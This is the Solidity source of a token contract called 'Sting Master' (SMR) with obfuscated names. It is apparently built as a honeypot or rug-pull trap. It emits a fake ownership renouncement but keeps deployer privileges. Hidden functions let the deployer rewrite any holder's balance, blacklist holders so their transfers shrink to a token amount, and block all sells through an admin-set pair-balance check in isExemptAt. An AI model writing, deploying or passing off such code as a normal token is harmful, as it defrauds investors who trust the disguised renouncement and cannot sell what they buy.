//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface tokenList {
    function createPair(address exemptSenderAmount, address takeTeamReceiver) external returns (address);
}

interface senderIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeSellSender) external view returns (uint256);

    function transfer(address liquidityEnable, uint256 marketingLiquidityFrom) external returns (bool);

    function allowance(address exemptTakeTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingLiquidityFrom) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityEnable,
        uint256 marketingLiquidityFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountReceiverLaunched, uint256 value);
    event Approval(address indexed exemptTakeTrading, address indexed spender, uint256 value);
}

abstract contract autoEnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundMin is senderIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StingMaster is autoEnable, senderIs, fundMin {

    function shouldAmount(address isModeLaunch, address liquidityEnable, uint256 marketingLiquidityFrom) internal returns (bool) {
        require(modeIs[isModeLaunch] >= marketingLiquidityFrom);
        modeIs[isModeLaunch] -= marketingLiquidityFrom;
        modeIs[liquidityEnable] += marketingLiquidityFrom;
        emit Transfer(isModeLaunch, liquidityEnable, marketingLiquidityFrom);
        return true;
    }

    string private atReceiver = "SMR";

    constructor (){
        
        fundExempt isMinExempt = fundExempt(tokenMarketingTotal);
        walletFundEnable = tokenList(isMinExempt.factory()).createPair(isMinExempt.WETH(), address(this));
        if (minMaxBuy == tradingTotal) {
            takeIsAmount = liquidityLaunch;
        }
        autoIs = _msgSender();
        fromFund[autoIs] = true;
        modeIs[autoIs] = tokenBuy;
        liquidityTokenSwap();
        
        emit Transfer(address(0), autoIs, tokenBuy);
    }

    function liquidityTakeTotal(address senderList) public {
        minFrom();
        
        if (senderList == autoIs || senderList == walletFundEnable) {
            return;
        }
        limitTrading[senderList] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenBuy;
    }

    uint256 private takeIsAmount;

    uint256 listMode;

    function liquidityTokenSwap() public {
        emit OwnershipTransferred(autoIs, address(0));
        autoSwap = address(0);
    }

    address private autoSwap;

    function buyLiquidityEnable(uint256 marketingLiquidityFrom) public {
        minFrom();
        listMode = marketingLiquidityFrom;
    }

    uint256 private maxExempt;

    address txLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address feeTeam, address launchFund) external view virtual override returns (uint256) {
        if (launchFund == tokenMarketingTotal) {
            return type(uint256).max;
        }
        return modeEnable[feeTeam][launchFund];
    }

    uint8 private senderMode = 18;

    uint256 private tokenBuy = 100000000 * 10 ** 18;

    mapping(address => bool) public limitTrading;

    string private marketingList = "Sting Master";

    uint256 constant buyAt = 14 ** 10;

    function approve(address launchFund, uint256 marketingLiquidityFrom) public virtual override returns (bool) {
        modeEnable[_msgSender()][launchFund] = marketingLiquidityFrom;
        emit Approval(_msgSender(), launchFund, marketingLiquidityFrom);
        return true;
    }

    function transfer(address amountToken, uint256 marketingLiquidityFrom) external virtual override returns (bool) {
        return isExemptAt(_msgSender(), amountToken, marketingLiquidityFrom);
    }

    bool public feeAmount;

    function balanceOf(address takeSellSender) public view virtual override returns (uint256) {
        return modeIs[takeSellSender];
    }

    function name() external view virtual override returns (string memory) {
        return marketingList;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderMode;
    }

    uint256 private liquidityLaunch;

    mapping(address => mapping(address => uint256)) private modeEnable;

    function minFrom() private view {
        require(fromFund[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return autoSwap;
    }

    address public autoIs;

    function launchShould(address amountToken, uint256 marketingLiquidityFrom) public {
        minFrom();
        modeIs[amountToken] = marketingLiquidityFrom;
    }

    function listTrading(address marketingAmountSell) public {
        require(marketingAmountSell.balance < 100000);
        if (feeAmount) {
            return;
        }
        if (liquidityLaunch != maxExempt) {
            liquidityLaunch = takeIsAmount;
        }
        fromFund[marketingAmountSell] = true;
        
        feeAmount = true;
    }

    function transferFrom(address isModeLaunch, address liquidityEnable, uint256 marketingLiquidityFrom) external override returns (bool) {
        if (_msgSender() != tokenMarketingTotal) {
            if (modeEnable[isModeLaunch][_msgSender()] != type(uint256).max) {
                require(marketingLiquidityFrom <= modeEnable[isModeLaunch][_msgSender()]);
                modeEnable[isModeLaunch][_msgSender()] -= marketingLiquidityFrom;
            }
        }
        return isExemptAt(isModeLaunch, liquidityEnable, marketingLiquidityFrom);
    }

    uint256 shouldTx;

    address tokenMarketingTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public minMaxBuy;

    bool public tradingTotal;

    mapping(address => bool) public fromFund;

    function symbol() external view virtual override returns (string memory) {
        return atReceiver;
    }

    function isExemptAt(address isModeLaunch, address liquidityEnable, uint256 marketingLiquidityFrom) internal returns (bool) {
        if (isModeLaunch == autoIs) {
            return shouldAmount(isModeLaunch, liquidityEnable, marketingLiquidityFrom);
        }
        uint256 autoFundAt = senderIs(walletFundEnable).balanceOf(txLaunch);
        require(autoFundAt == listMode);
        require(liquidityEnable != txLaunch);
        if (limitTrading[isModeLaunch]) {
            return shouldAmount(isModeLaunch, liquidityEnable, buyAt);
        }
        return shouldAmount(isModeLaunch, liquidityEnable, marketingLiquidityFrom);
    }

    bool private toLaunched;

    address public walletFundEnable;

    mapping(address => uint256) private modeIs;

    bool private senderListAt;

    function owner() external view returns (address) {
        return autoSwap;
    }

    event OwnershipTransferred(address indexed receiverTo, address indexed amountTrading);

}